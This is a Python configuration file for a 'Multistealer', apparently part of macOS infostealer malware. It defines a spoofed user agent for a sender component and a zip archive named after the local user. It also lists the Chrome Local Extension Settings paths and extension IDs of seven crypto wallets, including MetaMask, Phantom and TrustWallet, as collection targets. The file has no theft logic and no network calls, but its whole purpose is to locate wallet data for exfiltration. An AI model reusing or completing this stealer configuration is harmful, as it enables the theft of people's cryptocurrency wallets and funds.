from enum import Enum
from os import environ


user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
user_profile = environ.get("HOME")
user = environ.get("USER")

class Browsers(Enum):
    CHROME = "Google"
    YANDEX = "Yandex"

class SenderConfig:
    UserAgent = user_agent

class MultistealerConfig:
    PoolSize = 5
    ZipName = f"{user}-st"

class BrowsersConfig:
    BrowsersPath = rf"{user_profile}/Library/Application Support/Google/Chrome/Default/Local Extension Settings/"
    
    WSLogs = [
        {
            "name": "MetaMask",
            "folders": ["nkbihfbeogaeaoehlefnkodbefgpgknn", "djclckkglechooblngghdinmeemkbgci", "ejbalbakoplchlghecdalmeeeajnimhm"],
            "path": rf"{user_profile}/Library/Application Support/Google/Chrome/Default/Local Extension Settings/",
        },
        {
            "name": "Phantom",
            "folders": ["bfnaelmomeimhlpmgjnjophhpkkoljpa"],
            "path": rf"{user_profile}/Library/Application Support/Google/Chrome/Default/Local Extension Settings/",
        },
        {
            "name": "Unisat",
            "folders": ["ppbibelpcjmhbdihakflkdcoccbgbkpo"],
            "path": rf"{user_profile}/Library/Application Support/Google/Chrome/Default/Local Extension Settings/",
        },
        {
            "name": "Backpack",
            "folders": ["aflkmfhebedbjioipglgcbcmnbpgliof"],
            "path": rf"{user_profile}/Library/Application Support/Google/Chrome/Default/Local Extension Settings/",
        },
        {
            "name": "TronLink",
            "folders": ["ibnejdfjmmkpcnlpebklmnkoeoihofec"],
            "path": rf"{user_profile}/Library/Application Support/Google/Chrome/Default/Local Extension Settings/",
        },
        {
            "name": "Solflare",
            "folders": ["bhhhlbepdkbapadjdnnojkbgioiodbic"],
            "path": rf"{user_profile}/Library/Application Support/Google/Chrome/Default/Local Extension Settings/",
        },
        {
            "name": "TrustWallet",
            "folders": ["egjidjbpglichdcondbcbdnbeeppgdph"],
            "path": rf"{user_profile}/Library/Application Support/Google/Chrome/Default/Local Extension Settings/",
        }
    ]